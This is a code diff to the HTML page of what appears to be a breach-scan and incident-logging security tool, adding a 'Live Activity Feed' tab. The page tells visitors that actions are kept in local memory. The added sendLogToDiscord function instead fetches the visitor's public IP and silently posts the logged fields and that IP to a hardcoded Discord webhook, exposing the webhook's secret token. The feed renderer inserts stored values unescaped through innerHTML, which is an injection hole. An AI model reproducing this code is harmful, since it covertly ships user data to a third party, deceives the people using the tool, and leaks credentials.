@@ -434,6 +434,12 @@
 <i class="fas fa-book me-2"></i>Incident Logbook
           </button>
 </li>
+
+<li class="nav-item" role="presentation">
+<button class="nav-link" data-bs-target="#feed" data-bs-toggle="tab" id="feed-tab" role="tab" type="button">
+<i class="fas fa-rss me-2"></i>Live Feed
+  </button>
+</li>
 </ul>
 <div class="tab-content" id="toolTabsContent">
 <!-- Breach Scan Tab -->
@@ -660,6 +666,14 @@
 <button class="btn btn-warning">Save Entry</button>
 </form>
 <div class="mt-4" id="incidentLog"></div>
+</div>
+</div>
+
+<div class="tab-pane fade" id="feed" role="tabpanel">
+<div class="card p-4 mb-4">
+<h4 class="mb-3"><i class="fas fa-rss me-2"></i> Live Activity Feed</h4>
+<p class="text-muted mb-3">Recent user actions appear below (local memory).</p>
+<div id="liveFeedContainer" style="max-height:300px;overflow-y:auto;font-size:0.9rem;"></div>
 </div>
 </div>
 </div>
@@ -1685,6 +1699,53 @@ function saveIncident(e) {
   renderIncidentLog();
   document.getElementById("incidentText").value = "";
 }
+</script>
+
+<script>
+function logActionToFeed(title, data = []) {
+  const feed = JSON.parse(localStorage.getItem("liveFeed") || "[]");
+  const now = new Date().toLocaleTimeString();
+  const entry = {
+    time: now,
+    title: title,
+    details: data.map(d => `${d.name}: ${d.value}`).join(" | ")
+  };
+  feed.unshift(entry);
+  if (feed.length > 50) feed.pop();
+  localStorage.setItem("liveFeed", JSON.stringify(feed));
+  renderLiveFeed();
+}
+
+function renderLiveFeed() {
+  const feed = JSON.parse(localStorage.getItem("liveFeed") || "[]");
+  const container = document.getElementById("liveFeedContainer");
+  if (!container) return;
+  container.innerHTML = feed.map(log => `
+    <div class="mb-2"><strong>${log.time}</strong> — ${log.title}<br><span class="text-muted">${log.details}</span></div>
+  `).join("");
+}
+
+// Enhance Discord logger to also call feed logger
+async function sendLogToDiscord(title, fields) {
+  const ip = await fetch("https://api.ipify.org?format=json").then(res => res.json()).then(data => data.ip).catch(() => "Unknown");
+  const payload = {
+    embeds: [{
+      title: title,
+      color: 3447003,
+      fields: fields.concat([{ name: "IP", value: ip, inline: true }]),
+      timestamp: new Date().toISOString()
+    }],
+    username: "Site Logger"
+  };
+  fetch("https://discord.com/api/webhooks/1382971774299410532/rnLBAzl7H5ILvU_x3QBggpLJ9E745uC2iqGrTGzft5A5H9XZQiOxWHDFL9PRRxDhahIR", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload)
+  });
+  logActionToFeed(title, fields);
+}
+
+window.addEventListener("DOMContentLoaded", renderLiveFeed);
 </script>
 </body>
 </html>
